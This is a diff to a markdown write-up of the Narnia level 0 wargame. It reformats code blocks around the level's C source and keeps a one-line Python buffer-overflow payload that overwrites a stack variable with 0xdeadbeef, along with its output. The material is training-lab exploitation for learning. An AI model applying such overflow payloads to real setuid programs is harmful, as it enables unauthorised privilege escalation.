@@ -10,7 +10,9 @@ Linux narnia 4.18.12 x86_64 GNU/Linux
 ... SNIP BANNER ...
 
 ```bash
-narnia0@narnia:~$ cat /narnia/narnia0.c                                                                                                                               /*
+narnia0@narnia:~$ cat /narnia/narnia0.c
+```
+```c                                                                                                                               /*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
@@ -50,6 +52,8 @@ int main(){
     
     return 0;
 }
+```
+```bash
 narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
